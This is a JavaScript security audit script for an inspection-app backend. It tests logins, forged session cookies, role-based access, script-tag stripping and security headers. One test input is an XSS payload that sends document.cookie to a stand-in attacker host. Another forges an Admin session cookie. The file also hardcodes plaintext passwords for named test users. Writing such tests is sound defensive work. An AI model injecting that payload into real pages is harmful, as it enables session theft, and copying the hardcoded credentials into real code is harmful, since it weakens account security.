import http from "http";

const BASE_URL = process.env.TEST_URL || "http://localhost:3000";

function req(method, path, body = null, cookie = null) {
  return new Promise((resolve) => {
    const url = new URL(path, BASE_URL);
    const postData = body ? JSON.stringify(body) : null;
    const headers = { "Content-Type": "application/json" };
    if (postData) headers["Content-Length"] = Buffer.byteLength(postData);
    if (cookie) headers["Cookie"] = cookie;

    const start = Date.now();
    const request = http.request(
      url,
      { method, headers, timeout: 10000 },
      (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          let json = null;
          try { json = JSON.parse(data); } catch {}
          const setCookie = res.headers["set-cookie"];
          const sessionCookie = setCookie ? setCookie.find(c => c.startsWith("dac_session=")) : null;
          resolve({
            status: res.statusCode,
            headers: res.headers,
            json,
            raw: data,
            ms: Date.now() - start,
            sessionCookie,
          });
        });
      }
    );

    request.on("error", (e) => resolve({ status: 0, error: e.message }));
    if (postData) request.write(postData);
    request.end();
  });
}

function section(title) {
  console.log(`\n== ${title} ==`);
}

let passed = 0;
let failed = 0;

function assert(description, condition, details = "") {
  if (condition) {
    passed++;
    console.log(`  PASS ${description} ${details ? " -> " + details : ""}`);
  } else {
    failed++;
    console.error(`  FAIL ${description} ${details ? " -> " + details : ""}`);
  }
}

async function runSecurityAudit() {
  console.log("============================================================");
  console.log("  DAC INSPECTION APP — BACKEND & PRODUCTION SECURITY AUDIT");
  console.log(`  Target: ${BASE_URL}`);
  console.log("============================================================");

  // 1. Password Auth & Role Mapping Tests
  section("1. PASSWORD AUTHENTICATION & ROLE MAPPING (Column G)");

  let r = await req("POST", "/api/auth", { userName: "Raj", password: "TechExec@1001" });
  assert("Valid password yields role 'Technical Executive'", r.status === 200 && r.json?.role === "Technical Executive", `status: ${r.status}`);
  const teCookie = r.sessionCookie;

  r = await req("POST", "/api/auth", { userName: "Arun", password: "SiteEng@1002" });
  assert("Valid password yields role 'Site Engineer'", r.status === 200 && r.json?.role === "Site Engineer", `status: ${r.status}`);
  const seCookie = r.sessionCookie;

  r = await req("POST", "/api/auth", { userName: "Kumar", password: "QAQC@1003" });
  assert("Valid password yields role 'QA/QC In-Charge'", r.status === 200 && r.json?.role === "QA/QC In-Charge", `status: ${r.status}`);
  const qaqcCookie = r.sessionCookie;

  r = await req("POST", "/api/auth", { userName: "Administrator", password: "Admin@9990" });
  assert("Valid password yields role 'Admin'", r.status === 200 && r.json?.role === "Admin", `status: ${r.status}`);
  const adminCookie = r.sessionCookie;

  r = await req("POST", "/api/auth", { userName: "Raj", password: "WrongPassword123" });
  assert("Invalid password rejected -> 401", r.status === 401, `status: ${r.status}`);

  // 2. Cookie Tampering & Session Hijacking Defense
  section("2. COOKIE INTEGRITY & HAMC SESSION SIGNATURE DEFENSE");

  // Tampered cookie (fake Admin payload with broken HMAC signature)
  const tamperedPayload = Buffer.from(JSON.stringify({ user_id: "U999", role: "Admin", name: "Hacker" })).toString("base64url");
  const tamperedCookie = `dac_session=${tamperedPayload}.fake_signature_hash`;

  r = await req("GET", "/api/auth", null, tamperedCookie);
  assert("Tampered session cookie rejected -> 401", r.status === 401, `status: ${r.status}`);

  r = await req("POST", "/api/submit", { inspectionId: "TEST-TAMPER-01" }, tamperedCookie);
  assert("Tampered session rejected on /api/submit -> 401", r.status === 401, `status: ${r.status}`);

  // 3. RBAC & Endpoint Authorization Enforcement
  section("3. ROLE-BASED ACCESS CONTROL (RBAC) ENFORCEMENT");

  // Site Engineer attempting to create an inspection
  r = await req("POST", "/api/submit", {
    inspectionId: `SEC-SE-CREATE-${Date.now()}`,
    projectName: "DAC Aspire Heights",
    unitNumber: "A-101",
    inspectionType: "IJI",
  }, seCookie);
  assert("Site Engineer forbidden from creating inspection -> 403", r.status === 403, `status: ${r.status}`);

  // QA/QC attempting to create an inspection
  r = await req("POST", "/api/submit", {
    inspectionId: `SEC-QA-CREATE-${Date.now()}`,
    projectName: "DAC Aspire Heights",
    unitNumber: "A-101",
    inspectionType: "IJI",
  }, qaqcCookie);
  assert("QA/QC forbidden from creating inspection -> 403", r.status === 403, `status: ${r.status}`);

  // Admin attempting to sign individual signature box
  const inspId = `SEC-INSP-${Date.now()}`;
  await req("POST", "/api/submit", {
    inspectionId: inspId,
    projectName: "DAC Aspire Heights",
    unitNumber: "A-101",
    inspectionType: "IJI",
    customerVerificationPhoto: "data:image/png;base64,iVBORw0KGgo=",
  }, teCookie);

  r = await req("POST", "/api/approval", {
    inspectionId: inspId,
    action: "approve",
    comments: "Admin signing directly",
  }, adminCookie);
  assert("Admin forbidden from signing individual role boxes -> 403", r.status === 403, `status: ${r.status} json: ${JSON.stringify(r.json)}`);

  // 4. Input Sanitization & Script Injection Defense
  section("4. INPUT SANITIZATION & SCRIPT INJECTION DEFENSE");

  const xssId = `SEC-XSS-${Date.now()}`;
  r = await req("POST", "/api/submit", {
    inspectionId: xssId,
    projectName: "<script>alert('xss')</script>DAC Aspire",
    unitNumber: "A-101",
    inspectionType: "IJI",
    generalRemarks: "<script>fetch('http://attacker.com?c='+document.cookie)</script>Normal remark",
    customerVerificationPhoto: "data:image/png;base64,iVBORw0KGgo=",
  }, teCookie);

  assert("Inspection with script tags processed cleanly -> 200", r.status === 200, `status: ${r.status}`);

  r = await req("GET", `/api/draft?inspectionId=${xssId}`);
  assert("XSS script tags stripped from stored data", r.status === 200 && !r.raw.includes("<script>alert"), "HTML/Script tags stripped");

  // 5. HTTP Security Headers Verification
  section("5. PRODUCTION SECURITY HEADERS AUDIT");

  r = await req("GET", "/");
  assert("X-Frame-Options is DENY", r.headers["x-frame-options"] === "DENY", r.headers["x-frame-options"]);
  assert("X-Content-Type-Options is nosniff", r.headers["x-content-type-options"] === "nosniff", r.headers["x-content-type-options"]);
  assert("Content-Security-Policy header present", !!r.headers["content-security-policy"], "CSP present");
  assert("Referrer-Policy header present", !!r.headers["referrer-policy"], r.headers["referrer-policy"]);
  assert("Permissions-Policy header present", !!r.headers["permissions-policy"], r.headers["permissions-policy"]);

  console.log("\n============================================================");
  console.log("  SECURITY AUDIT RESULTS SUMMARY");
  console.log("============================================================");
  console.log(`  PASSED:  ${passed}`);
  console.log(`  FAILED:  ${failed}`);
  console.log(`  Total Security Tests: ${passed + failed}`);
  console.log("============================================================");

  process.exit(failed > 0 ? 1 : 0);
}

runSecurityAudit();
